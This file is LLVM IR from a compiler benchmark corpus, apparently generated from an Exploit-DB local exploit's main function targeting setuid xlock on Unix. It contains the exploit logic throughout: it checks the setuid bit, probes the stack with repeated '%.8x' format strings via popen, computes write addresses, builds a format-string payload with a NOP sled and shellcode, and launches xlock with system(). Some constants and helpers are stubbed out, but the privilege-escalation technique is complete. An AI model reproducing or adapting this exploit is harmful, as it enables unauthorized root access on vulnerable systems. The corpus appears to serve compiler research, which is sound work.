; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20154.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20154.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@FMTSIZE = common dso_local global i32 0, align 4
@CMDSIZE = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@XLOCK_PATH = common dso_local global i8* null, align 8
@errno = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"whereis xlock?\00", align 1
@S_IXOTH = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [12 x i8] c"executable?\00", align 1
@S_ISUID = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [11 x i8] c"not setuid\00", align 1
@BIGBREAKFAST = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [6 x i8] c"%.8x \00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"%s -d '%s' 2>&1\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"01010101\00", align 1
@.str.7 = private unnamed_addr constant [36 x i8] c"could not find fmt str on the stack\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.9 = private unnamed_addr constant [45 x i8] c"reached end of output string and no 01010101\00", align 1
@shellcode = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [11 x i8] c"%s -d '%s'\00", align 1
@.str.11 = private unnamed_addr constant [23 x i8] c"====== system() ======\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"====== end system ======\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"\0Asystem() returned %d\0A\00", align 1
@.str.14 = private unnamed_addr constant [21 x i8] c"prebuf was %d bytes\0A\00", align 1
@.str.15 = private unnamed_addr constant [24 x i8] c"breakfast was %d words\0A\00", align 1
@.str.16 = private unnamed_addr constant [20 x i8] c"location was %.8lx\0A\00", align 1
@.str.17 = private unnamed_addr constant [17 x i8] c"value was %.8lx\0A\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"exiting.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca [65536 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i64, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %struct.stat, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %20 = load i32, i32* @FMTSIZE, align 4
  %21 = zext i32 %20 to i64
  %22 = call i8* @llvm.stacksave()
  store i8* %22, i8** %8, align 8
  %23 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %9, align 8
  %24 = load i32, i32* @CMDSIZE, align 4
  %25 = zext i32 %24 to i64
  %26 = alloca i8, i64 %25, align 16
  store i64 %25, i64* %10, align 8
  store i32 4, i32* %17, align 4
  %27 = load i32, i32* @OFFSET, align 4
  store i32 %27, i32* %18, align 4
  %28 = load i8*, i8** @XLOCK_PATH, align 8
  %29 = call i32 @stat(i8* %28, %struct.stat* %19)
  store i32 %29, i32* %11, align 4
  %30 = load i32, i32* %11, align 4
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %32, label %35

32:                                               ; preds = %2
  %33 = load i32, i32* @errno, align 4
  %34 = call i32 @error(i32 1, i32 %33, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  br label %35

35:                                               ; preds = %32, %2
  %36 = getelementptr inbounds %struct.stat, %struct.stat* %19, i32 0, i32 0
  %37 = load i32, i32* %36, align 4
  %38 = load i32, i32* @S_IXOTH, align 4
  %39 = and i32 %37, %38
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %43, label %41

41:                                               ; preds = %35
  %42 = call i32 @error(i32 1, i32 0, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  br label %43

43:                                               ; preds = %41, %35
  %44 = getelementptr inbounds %struct.stat, %struct.stat* %19, i32 0, i32 0
  %45 = load i32, i32* %44, align 4
  %46 = load i32, i32* @S_ISUID, align 4
  %47 = and i32 %45, %46
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %51, label %49

49:                                               ; preds = %43
  %50 = call i32 @error(i32 1, i32 0, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  br label %51

51:                                               ; preds = %49, %43
  %52 = load i32, i32* %4, align 4
  %53 = icmp sgt i32 %52, 1
  br i1 %53, label %54, label %59

54:                                               ; preds = %51
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @atoi(i8* %57)
  store i32 %58, i32* %18, align 4
  br label %59

59:                                               ; preds = %54, %51
  %60 = getelementptr inbounds [65536 x i8], [65536 x i8]* %7, i64 0, i64 0
  %61 = call i32 @memset(i8* %60, i32 0, i32 65536)
  %62 = load i32, i32* @FMTSIZE, align 4
  %63 = call i32 @memset(i8* %23, i32 32, i32 %62)
  store i32 0, i32* %11, align 4
  store i8* %23, i8** %12, align 8
  br label %64

64:                                               ; preds = %73, %59
  %65 = load i32, i32* %11, align 4
  %66 = load i32, i32* @BIGBREAKFAST, align 4
  %67 = icmp slt i32 %65, %66
  br i1 %67, label %68, label %76

68:                                               ; preds = %64
  %69 = load i8*, i8** %12, align 8
  %70 = call i32 @memcpy(i8* %69, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i32 5)
  %71 = load i8*, i8** %12, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 5
  store i8* %72, i8** %12, align 8
  br label %73

73:                                               ; preds = %68
  %74 = load i32, i32* %11, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %11, align 4
  br label %64

76:                                               ; preds = %64
  %77 = call i32 @memset(i8* %23, i32 32, i32 10)
  %78 = load i32, i32* @FMTSIZE, align 4
  %79 = sub nsw i32 %78, 1
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %23, i64 %80
  store i8 0, i8* %81, align 1
  store i32 0, i32* %11, align 4
  br label %82

82:                                               ; preds = %109, %76
  %83 = load i32, i32* %11, align 4
  store i32 %83, i32* %13, align 4
  %84 = load i32, i32* %11, align 4
  %85 = call i32 @memset(i8* %23, i32 3, i32 %84)
  %86 = load i32, i32* %11, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %23, i64 %87
  %89 = call i32 @memset(i8* %88, i32 1, i32 4)
  %90 = load i8*, i8** @XLOCK_PATH, align 8
  %91 = call i32 @sprintf(i8* %26, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i8* %90, i8* %23)
  %92 = call i32* @popen(i8* %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  store i32* %92, i32** %6, align 8
  %93 = getelementptr inbounds [65536 x i8], [65536 x i8]* %7, i64 0, i64 0
  %94 = call i32 @memset(i8* %93, i32 0, i32 65536)
  %95 = getelementptr inbounds [65536 x i8], [65536 x i8]* %7, i64 0, i64 0
  %96 = load i32*, i32** %6, align 8
  %97 = call i32 @fread(i8* %95, i32 1024, i32 64, i32* %96)
  %98 = load i32*, i32** %6, align 8
  %99 = call i32 @fclose(i32* %98)
  %100 = load i32, i32* %11, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %11, align 4
  br label %102

102:                                              ; preds = %82
  %103 = getelementptr inbounds [65536 x i8], [65536 x i8]* %7, i64 0, i64 0
  %104 = call i32 @strstr(i8* %103, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %109, label %106

106:                                              ; preds = %102
  %107 = load i32, i32* %11, align 4
  %108 = icmp slt i32 %107, 4
  br label %109

109:                                              ; preds = %106, %102
  %110 = phi i1 [ false, %102 ], [ %108, %106 ]
  br i1 %110, label %82, label %111

111:                                              ; preds = %109
  %112 = load i32, i32* %13, align 4
  %113 = icmp eq i32 %112, 4
  br i1 %113, label %114, label %116

114:                                              ; preds = %111
  %115 = call i32 @error(i32 1, i32 0, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.7, i64 0, i64 0))
  br label %116

116:                                              ; preds = %114, %111
  %117 = getelementptr inbounds [65536 x i8], [65536 x i8]* %7, i64 0, i64 0
  %118 = call i32 @memset(i8* %117, i32 32, i32 40)
  %119 = getelementptr inbounds [65536 x i8], [65536 x i8]* %7, i64 0, i64 0
  %120 = call i8* @strtok(i8* %119, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  store i8* %120, i8** %12, align 8
  %121 = load i8*, i8** %12, align 8
  %122 = call i64 @strtoul(i8* %121, i32* null, i32 16)
  store i64 %122, i64* %15, align 8
  %123 = load i32, i32* %18, align 4
  %124 = sext i32 %123 to i64
  %125 = load i64, i64* %15, align 8
  %126 = sub i64 %125, %124
  store i64 %126, i64* %15, align 8
  %127 = load i64, i64* %15, align 8
  %128 = add i64 %127, 12
  %129 = load i32, i32* %14, align 4
  %130 = mul nsw i32 %129, 4
  %131 = sext i32 %130 to i64
  %132 = add i64 %128, %131
  %133 = load i32, i32* @FMTSIZE, align 4
  %134 = sext i32 %133 to i64
  %135 = add i64 %132, %134
  %136 = load i32, i32* %17, align 4
  %137 = sext i32 %136 to i64
  %138 = sub i64 %135, %137
  %139 = sub i64 %138, 100
  store i64 %139, i64* %16, align 8
  store i32 1, i32* %14, align 4
  br label %140

140:                                              ; preds = %152, %116
  %141 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  store i8* %141, i8** %12, align 8
  %142 = load i8*, i8** %12, align 8
  %143 = icmp ne i8* %142, null
  br i1 %143, label %146, label %144

144:                                              ; preds = %140
  %145 = call i32 @error(i32 1, i32 0, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.9, i64 0, i64 0))
  br label %146

146:                                              ; preds = %144, %140
  %147 = load i8*, i8** %12, align 8
  %148 = call i32 @strcmp(i8* %147, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0))
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %151, label %150

150:                                              ; preds = %146
  br label %155

151:                                              ; preds = %146
  br label %152

152:                                              ; preds = %151
  %153 = load i32, i32* %14, align 4
  %154 = add nsw i32 %153, 1
  store i32 %154, i32* %14, align 4
  br label %140

155:                                              ; preds = %150
  %156 = load i32, i32* %13, align 4
  %157 = load i32, i32* %14, align 4
  %158 = load i64, i64* %15, align 8
  %159 = load i64, i64* %16, align 8
  %160 = call i8* @mkfmt(i32 %156, i32 %157, i64 %158, i64 %159)
  store i8* %160, i8** %12, align 8
  %161 = load i32, i32* @FMTSIZE, align 4
  %162 = call i32 @memset(i8* %23, i32 144, i32 %161)
  %163 = load i8*, i8** %12, align 8
  %164 = load i8*, i8** %12, align 8
  %165 = call i32 @strlen(i8* %164)
  %166 = call i32 @memcpy(i8* %23, i8* %163, i32 %165)
  %167 = load i8*, i8** %12, align 8
  %168 = call i32 @free(i8* %167)
  %169 = load i32, i32* @FMTSIZE, align 4
  %170 = load i32, i32* %17, align 4
  %171 = sub nsw i32 %169, %170
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds i8, i8* %23, i64 %172
  store i8* %173, i8** %12, align 8
  %174 = load i8*, i8** %12, align 8
  %175 = load i32, i32* @shellcode, align 4
  %176 = call i32 @strcpy(i8* %174, i32 %175)
  %177 = load i8*, i8** @XLOCK_PATH, align 8
  %178 = call i32 @sprintf(i8* %26, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.10, i64 0, i64 0), i8* %177, i8* %23)
  %179 = call i32 @puts(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.11, i64 0, i64 0))
  %180 = call i32 @system(i8* %26)
  store i32 %180, i32* %11, align 4
  %181 = call i32 @puts(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0))
  %182 = load i32, i32* %11, align 4
  %183 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i64 0, i64 0), i32 %182)
  %184 = load i32, i32* %13, align 4
  %185 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.14, i64 0, i64 0), i32 %184)
  %186 = load i32, i32* %14, align 4
  %187 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.15, i64 0, i64 0), i32 %186)
  %188 = load i64, i64* %15, align 8
  %189 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.16, i64 0, i64 0), i64 %188)
  %190 = load i64, i64* %16, align 8
  %191 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.17, i64 0, i64 0), i64 %190)
  %192 = call i32 @puts(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %193 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %193)
  %194 = load i32, i32* %3, align 4
  ret i32 %194
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @stat(i8*, %struct.stat*) #2

declare dso_local i32 @error(i32, i32, i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #2

declare dso_local i32* @popen(i8*, i8*) #2

declare dso_local i32 @fread(i8*, i32, i32, i32*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @strstr(i8*, i8*) #2

declare dso_local i8* @strtok(i8*, i8*) #2

declare dso_local i64 @strtoul(i8*, i32*, i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #2

declare dso_local i8* @mkfmt(i32, i32, i64, i64) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @strcpy(i8*, i32) #2

declare dso_local i32 @puts(i8*) #2

declare dso_local i32 @system(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
